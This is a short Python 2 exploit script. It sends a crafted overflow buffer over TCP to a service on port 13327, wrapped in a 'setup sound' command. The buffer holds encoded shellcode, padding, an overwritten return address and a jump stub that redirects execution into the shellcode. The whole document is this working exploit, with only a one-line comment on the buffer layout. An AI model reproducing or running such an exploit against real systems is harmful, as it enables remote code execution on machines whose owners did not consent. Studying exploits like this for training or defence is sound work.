#!/usr/bin/python
import socket

host = "127.0.0.1"


shellcode = ("\xb8\x3d\x85\x1f\xfc\xd9\xcd\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1"
"\x14\x31\x45\x14\x83\xc5\x04\x03\x45\x10\xdf\x70\x2e\x27\xe8"
"\x98\x02\x94\x45\x35\xa7\x93\x88\x79\xc1\x6e\xca\x21\x50\x23"
"\xa2\xd7\x6c\xd2\x6e\xb2\x7c\x85\xde\xcb\x9c\x4f\xb8\x93\x93"
"\x10\xcd\x65\x28\xa2\xc9\xd5\x56\x09\x51\x56\x27\xf7\x9c\xd9"
"\xd4\xa1\x74\xe5\x82\x9c\x08\x50\x4a\xe7\x60\x4c\x83\x64\x18"
"\xfa\xf4\xe8\xb1\x94\x83\x0e\x11\x3a\x1d\x31\x21\xb7\xd0\x32")

#Shellcode + (First A's - Shellcode size)  + Return + Address + EAX after "sound setup "
crash=shellcode + "\x41" * (4368-105) + "\x96\x45\x13\x08" + "\x83\xc0\x0c\xff\xe0\x90\x90" 



buffer = "\x11(setup sound " + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host, 13327))
data=s.recv(1024)
print data
s.send(buffer)
s.close()
print "[*]Payload Sent !"

